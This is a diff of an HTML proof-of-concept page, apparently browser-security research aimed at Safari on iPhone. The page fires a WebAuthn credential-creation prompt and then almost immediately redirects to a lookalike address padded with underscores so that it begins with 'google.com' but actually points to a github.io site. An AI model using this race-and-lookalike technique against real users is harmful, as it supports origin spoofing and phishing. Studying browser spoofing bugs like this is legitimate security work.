@@ -3,31 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>WebAuthn Attestation + Underscore Hostname Redirect Probe</title>
+<title>Fast WebAuthn Attestation + Redirect</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #121212; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; color: #e5e5e5; }
-  .panel { background: #1e1e1e; padding: 28px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); max-width: 640px; width: 100%; border: 1px solid #333; }
+  .panel { background: #1e1e1e; padding: 28px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); max-width: 620px; width: 100%; border: 1px solid #333; }
   h2 { color: #60a5fa; margin-bottom: 8px; font-size: 18px; }
-  p { color: #a3a3a3; font-size: 13px; margin-bottom: 14px; line-height: 1.5; word-break: break-all; }
-  label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 4px; }
-  input { width: 100%; padding: 9px 12px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #404040; background: #121212; color: #fff; font-family: monospace; font-size: 12px; }
-  button { padding: 12px 18px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; width: 100%; }
+  p { color: #a3a3a3; font-size: 13px; margin-bottom: 16px; line-height: 1.5; word-break: break-all; }
+  button { padding: 13px 18px; background: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; width: 100%; }
   button:hover { background: #1d4ed8; }
   button:disabled { background: #374151; cursor: not-allowed; }
-  #log { margin-top: 14px; padding: 12px; background: #0b0b0b; border-radius: 8px; font-family: monospace; font-size: 11px; color: #93c5fd; max-height: 260px; overflow-y: auto; white-space: pre-wrap; }
+  #log { margin-top: 14px; padding: 12px; background: #0b0b0b; border-radius: 8px; font-family: monospace; font-size: 11px; color: #93c5fd; max-height: 240px; overflow-y: auto; white-space: pre-wrap; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h2>WebAuthn Attestation + Underscore Hostname Redirect</h2>
-  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) dan menguji redirect/parsing ke <code>https://?.________________________________________________________________________________________________________________________google.com/</code>.</p>
-
-  <label for="redirectDelayMs">Jeda (ms) sebelum redirect:</label>
-  <input id="redirectDelayMs" type="number" value="150" min="0" max="10000" />
-
-  <button id="runTargetBtn">Trigger WebAuthn Attestation &amp; Redirect</button>
+  <h2>Fast WebAuthn Attestation &amp; Redirect</h2>
+  <p>Memicu <code>navigator.credentials.create()</code> (<code>attestation: "direct"</code>) lalu langsung menjalankan <code>location.replace()</code> ke <code>https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/</code>.</p>
+  <button id="fastGoBtn">Trigger WebAuthn &amp; Fast Redirect</button>
   <div id="log">[*] Ready...</div>
 </div>
 
@@ -35,9 +29,9 @@
 (function () {
   'use strict';
 
-  var RAW_TARGET = 'https://?.________________________________________________________________________________________________________________________google.com/';
-  var delayInput = document.getElementById('redirectDelayMs');
-  var runBtn = document.getElementById('runTargetBtn');
+  var TARGET_URL = 'https://google.com____________________________________________________________.artha231.github.io/Safari-Iphone-/';
+  var FAST_DELAY_MS = 10;
+  var btn = document.getElementById('fastGoBtn');
   var logEl = document.getElementById('log');
   var t0 = performance.now();
 
@@ -46,7 +40,7 @@
     var line = `[+${elapsed}ms] ${msg}`;
     logEl.textContent += '\n' + line;
     logEl.scrollTop = logEl.scrollHeight;
-    console.log('[UnderscoreTargetProbe] ' + line);
+    console.log('[FastWebAuthnRedirect] ' + line);
   }
 
   function randomBytes(len) {
@@ -55,48 +49,37 @@
     return arr;
   }
 
-  ['blur', 'focus', 'visibilitychange', 'pagehide'].forEach(function (evName) {
+  ['blur', 'visibilitychange', 'pagehide'].forEach(function (evName) {
     var target = (evName === 'visibilitychange') ? document : window;
     target.addEventListener(evName, function (e) {
       log(
-        `event:${evName} -> origin=${window.location.origin}, href=${window.location.href}, ` +
-        `hidden=${document.hidden}, persisted=${Boolean(e && e.persisted)}`
+        `event:${evName} -> href=${window.location.href}, hidden=${document.hidden}, ` +
+        `persisted=${Boolean(e && e.persisted)}`
       );
     });
   });
 
-  function inspectTargetUrl(url) {
-    try {
-      var parsed = new URL(url);
-      log(`[URL ok] hostname="${parsed.hostname}", pathname="${parsed.pathname}", search="${parsed.search}"`);
-      return parsed.href;
-    } catch (err) {
-      log(`[URL rejected] ${err.name}: ${err.message}`);
-      return null;
-    }
-  }
-
-  function triggerWebAuthnAttestation() {
+  function triggerAttestation() {
     if (!window.isSecureContext) {
       log('[-] Bukan Secure Context (HTTPS atau localhost wajib untuk WebAuthn).');
-      return null;
+      return;
     }
     if (!navigator.credentials || typeof navigator.credentials.create !== 'function') {
       log('[-] navigator.credentials.create tidak tersedia.');
-      return null;
+      return;
     }
 
     var rpId = window.location.hostname || 'localhost';
-    log(`[*] Memanggil credentials.create(attestation="direct", rp.id="${rpId}", origin="${window.location.origin}")...`);
+    log(`[*] credentials.create(attestation="direct", rp.id="${rpId}")...`);
 
-    return navigator.credentials.create({
+    navigator.credentials.create({
       publicKey: {
         challenge: randomBytes(32),
         rp: { name: rpId, id: rpId },
         user: {
           id: randomBytes(16),
           name: 'probe@' + rpId,
-          displayName: 'Underscore Target Probe'
+          displayName: 'Fast Probe'
         },
         pubKeyCredParams: [
           { type: 'public-key', alg: -7 },
@@ -106,32 +89,24 @@
         timeout: 15000
       }
     }).then(function (cred) {
-      var attLen = cred && cred.response && cred.response.attestationObject
-        ? cred.response.attestationObject.byteLength
-        : 0;
-      log(`[+] credentials.create RESOLVED -> id=${cred.id}, attestationObject=${attLen} bytes`);
+      log(`[+] RESOLVED -> id=${cred.id}`);
     }).catch(function (err) {
-      log(`[-] credentials.create REJECTED (${err.name}) -> ${err.message}`);
+      log(`[-] REJECTED (${err.name}) -> ${err.message}`);
     });
   }
 
-  runBtn.addEventListener('click', function () {
-    runBtn.disabled = true;
-    var delayMs = Math.max(0, Math.min(10000, parseInt(delayInput.value, 10) || 150));
+  btn.addEventListener('click', function () {
+    btn.disabled = true;
+    triggerAttestation();
 
-    triggerWebAuthnAttestation();
-    var normalized = inspectTargetUrl(RAW_TARGET);
+    queueMicrotask(function () {
+      log(`[microtask] scheduling location.replace in ${FAST_DELAY_MS}ms -> ${TARGET_URL}`);
+    });
 
     setTimeout(function () {
-      var targetToAssign = normalized || RAW_TARGET;
-      try {
-        var before = window.location.href;
-        window.location.href = targetToAssign;
-        log(`[*] window.location.href assigned -> "${targetToAssign}" (before="${before}", now="${window.location.href}")`);
-      } catch (navErr) {
-        log(`[-] Redirect error (${navErr.name}) -> ${navErr.message}`);
-      }
-    }, delayMs);
+      log('[*] Executing window.location.replace...');
+      window.location.replace(TARGET_URL);
+    }, FAST_DELAY_MS);
   }, { once: true });
 })();
 </script>
